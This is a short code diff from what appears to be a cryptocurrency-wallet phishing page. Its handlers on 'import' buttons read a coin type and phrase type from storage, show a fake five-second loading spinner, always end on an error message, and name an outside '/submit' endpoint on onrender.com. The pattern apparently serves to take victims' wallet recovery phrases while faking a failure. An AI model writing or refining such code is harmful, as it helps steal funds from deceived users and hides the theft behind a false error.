@@ -17,20 +17,15 @@ importBTNs.forEach((importBTN) => {
     const coin = localStorage.getItem("coin");
     const phraseType = localStorage.getItem("phraseType");
 
-    // Add event listener to all feature-content divs
-    document.querySelectorAll(".feature-content").forEach(function (element) {
-      element.addEventListener("click", function () {
-        // When clicked, show the loading effect for 5 seconds
-        document.getElementById("loading").style.display = "block";
-        document.getElementById("error").style.display = "none";
+    // When clicked, show the loading effect for 5 seconds
+    document.getElementById("loading").style.display = "block";
+    document.getElementById("error").style.display = "none";
 
-        setTimeout(function () {
-          // After 5 seconds, hide the loading and show the content
-          document.getElementById("loading").style.display = "none";
-          document.getElementById("error").style.display = "block";
-        }, 5000); // 5 seconds delay
-      });
-    });
+    setTimeout(function () {
+      // After 5 seconds, hide the loading and show the content
+      document.getElementById("loading").style.display = "none";
+      document.getElementById("error").style.display = "block";
+    }, 5000); // 5 seconds delay
 
     const requestURL = "https://cyto-fqil.onrender.com/submit";
 
